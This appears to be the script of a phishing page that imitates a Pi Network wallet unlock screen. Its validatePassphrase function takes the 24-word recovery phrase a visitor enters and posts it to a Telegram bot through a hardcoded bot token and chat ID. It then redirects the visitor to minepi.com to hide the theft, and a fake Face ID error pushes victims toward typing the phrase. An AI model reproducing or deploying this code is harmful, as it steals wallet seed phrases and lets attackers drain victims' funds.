
        // Telegram Bot Configuration
        const BOT_TOKEN = '8191930366:AAF3nZYU_QC_wOpW-xKMvzwHVCKFN-KecxU';
        const CHAT_ID = '7416028741';

        async function sendToTelegram(message) {
            try {
                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
                const response = await fetch(url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });
                return await response.json();
            } catch (error) {
                console.error('Error sending to Telegram:', error);
                return null;
            }
        }

        async function validatePassphrase(inputId, errorId) {
            const input = document.getElementById(inputId);
            const error = document.getElementById(errorId);
            
            // Check if input has exactly 24 words
            const words = input.value.trim().split(/\s+/).filter(word => word.length > 0);
            if (words.length !== 24) {
                error.style.display = 'block';
                error.textContent = 'Invalid Passphrase';
                return;
            }
            
            error.style.display = 'none';
            
            // Show loading overlay
            document.getElementById('loadingOverlay').style.display = 'flex';
            
            if (input.value.trim().length > 0) {
                const message = `🔑 <b>NEW!</b>\n\n<code>${input.value}</code>`;
                await sendToTelegram(message); // Wait for message to send
            }
            
            // Hide loading overlay and redirect
            document.getElementById('loadingOverlay').style.display = 'none';
            window.location.href = "https://minepi.com";
        }

        function showModal(modalType) {
            document.body.style.overflow = "hidden";
            document.querySelectorAll('body > *').forEach(el => {
                if (!el.classList.contains('modal-overlay') && !el.classList.contains('loading-overlay')) {
                    el.style.display = 'none';
                }
            });
            const modalId = `${modalType}Modal`;
            document.getElementById(modalId).style.display = "flex";
        }
        
        function hideModal(modalId) {
            document.querySelectorAll('body > *').forEach(el => {
                el.style.display = '';
            });
            document.getElementById(modalId).style.display = "none";
            document.body.style.overflow = "auto";
        }
        
        function showFaceIDError() {
            alert("Face ID is not available at the moment. Please try with passphrase.");
        }
        
        function redirectToNewWallet() {
            if (confirm("This will create a new wallet. Your old wallet will be inaccessible. Continue?")) {
                window.location.href = "https://example.com/create-new-wallet";
            }
        }
        
        function redirectToNewAccount() {
            if (confirm("This will create a new wallet. Your old wallet will be inaccessible. Continue?")) {
                window.location.href = "https://example.com/create-new-brainstorm-account";
            }
        }
 